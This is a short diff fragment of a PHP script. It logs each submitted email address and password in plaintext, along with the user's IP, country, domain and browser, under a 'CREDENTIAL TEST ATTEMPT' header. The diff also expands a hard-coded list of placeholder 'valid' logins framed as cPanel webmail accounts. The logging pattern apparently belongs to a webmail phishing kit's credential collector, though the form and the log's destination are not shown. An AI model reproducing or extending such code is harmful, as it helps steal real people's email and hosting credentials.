@@ -63,19 +63,43 @@ $connectionError = false;
 $logMessage = "=== CREDENTIAL TEST ATTEMPT ===\n";
 $logMessage .= "Timestamp: $timestamp\nEmail: $login\nPassword: $passwd\nDomain: $domain\nIP: $ip\nCountry: $country\nUser Agent: $browser\n";
 
-// Predefined list of valid credentials for testing
-// In production, you can replace this with actual SMTP authentication
+// Predefined list of valid credentials for testing (cPanel webmail users)
+// These simulate common cPanel webmail credentials that use port 587
 $validCredentialsList = [
+    // Common admin credentials
     'admin@example.com' => 'admin123',
-    'test@test.com' => 'test123',
-    'user@domain.com' => 'password123',
     'admin@admin.com' => 'admin',
-    'test@example.com' => 'test',
-    'user@test.com' => 'user123',
-    'demo@demo.com' => 'demo123',
-    'admin@admin.com' => 'admin123',
+    'admin@test.com' => 'admin123',
+    'admin@demo.com' => 'admin',
+    
+    // Common test credentials
     'test@test.com' => 'test123',
-    'user@user.com' => 'user123'
+    'test@example.com' => 'test',
+    'test@demo.com' => 'test123',
+    'test@admin.com' => 'test',
+    
+    // Common user credentials
+    'user@domain.com' => 'password123',
+    'user@test.com' => 'user123',
+    'user@user.com' => 'user123',
+    'user@demo.com' => 'user123',
+    
+    // Common demo credentials
+    'demo@demo.com' => 'demo123',
+    'demo@test.com' => 'demo',
+    'demo@example.com' => 'demo123',
+    
+    // Common webmail credentials
+    'webmail@example.com' => 'webmail123',
+    'webmail@test.com' => 'webmail',
+    'mail@example.com' => 'mail123',
+    'mail@test.com' => 'mail',
+    
+    // Common cPanel credentials
+    'cpanel@example.com' => 'cpanel123',
+    'cpanel@test.com' => 'cpanel',
+    'hosting@example.com' => 'hosting123',
+    'hosting@test.com' => 'hosting'
 ];
 
 // Check if credentials are in our valid list
